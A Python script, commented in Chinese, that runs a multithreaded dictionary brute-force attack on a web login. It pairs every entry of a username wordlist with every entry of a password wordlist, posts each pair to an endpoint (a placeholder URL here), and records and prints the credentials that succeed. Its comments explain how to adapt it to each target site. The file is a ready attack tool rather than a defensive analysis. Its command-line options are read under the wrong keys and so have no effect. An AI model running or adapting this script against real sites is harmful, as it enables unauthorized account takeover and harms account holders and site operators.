import argparse
import requests

from bruteforce import bruteforce, stop_brute, success_queue, dict_queue, success_username



def login():
    """
    登录和检测登录结果的代码针对每个网站分别完成
    login_info中保存了登录所需要的所有信息，可以是用户名密码组合，可以是单纯的密码
    :return:
    """
    try:
        login_info = dict_queue.get(block=False)
    except:
        return

    username = login_info[0]
    # 如果这个用户名已经被爆破出来密码，那么跳过这个用户名
    if username in success_username:
        return

    password = login_info[1]

    # ###############################实现登录过程开始
    payload = {
        "username": username,
        "password": password,
    }
    r = requests.post("https://httpbin.org/post", data=payload)
    #    r = requests.post("http://127.0.0.1/api/login", json=payload)
    # 判断是否登录成功
    # #################################实现登录过程结束

    # #################################检查密码是否正确开始
    #    if True:
    if r.status_code == 200:  # 根据实际情况修改此处，判定登录成功
        msg = login_info
        # 登录成功则把登录信息保存到success_queue
        success_queue.put(msg)
        # 把登录成功的用户名添加到 success_username中，之后可以跳过这个用户名的密码的爆破
        success_username.append(username)
        print(msg)

        # 如果想要爆破出来一个密码就立刻停止爆破，那么此处调用函数stop_brute，反之则注释此处
        stop_brute()




def get_dict(dict_user, dict_pass):
    """
    生成字典队列
    :return:
    """
    with open("dict/{}".format(dict_user)) as f:
        username = [line.strip() for line in f.readlines()]

    with open('dict/{}'.format(dict_pass)) as f:
        passwords = [line.strip() for line in f.readlines()]

    count = 0
    for u in username:
        for p in passwords:
            count += 1
            pair = (u, p)
            dict_queue.put(pair)
    print("字典生成完成，长度 {}".format(count))


def get_parse() -> dict:
    parser = argparse.ArgumentParser()
    parser.add_argument("--username", "-u", help="用户名字典")
    parser.add_argument("--password", "-p", help="密码字典")
    dic = vars(parser.parse_args())
    return dic


if __name__ == "__main__":

    args = get_parse()
    dict_username = args.get('dict_username', "username.txt")
    dict_password = args.get('dict_password', "password.txt")
    get_dict(dict_username,dict_password)

    bruteforce(login, thread_num=5)
